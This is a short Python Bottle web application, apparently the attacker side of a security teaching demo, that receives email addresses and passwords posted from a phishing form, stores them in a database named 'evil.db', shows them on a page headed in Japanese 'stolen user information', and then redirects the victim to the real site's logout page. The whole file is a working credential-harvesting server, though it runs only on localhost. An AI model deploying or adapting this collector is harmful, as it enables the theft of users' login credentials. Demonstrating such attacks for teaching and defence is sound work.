from bottle import route, run, template, request, redirect, response, abort
import sqlite3
from datetime import datetime


EVIL_DATABASE_FILE = 'evil.db'

@route('/users')
def list_users():
    conn = sqlite3.connect(EVIL_DATABASE_FILE)
    cur = conn.cursor()
    users = cur.execute('SELECT * FROM users;').fetchall()
    return template('''
<p>盗んだユーザー情報</p>
<table border="1">
  <tr><th>時刻</th><th>メールアドレス</th><th>パスワード</th></tr>
  %for user in users:
  <tr><td>{{ user[1] }}</td><td>{{ user[2] }}</td><td>{{ user[3] }}</td></tr>
  %end
</table>''', users=users)

@route('/users', method="post")
def add_user():
    email = request.forms.email
    password = request.forms.password
    conn = sqlite3.connect(EVIL_DATABASE_FILE)
    cur = conn.cursor()
    cur.execute('INSERT INTO users (datetime, email, password) VALUES (?, ?, ?)', (datetime.now(), email, password))
    conn.commit()
    redirect('http://localhost:8080/logout')
run(host='localhost', port=8081, debug=True, reloader=True)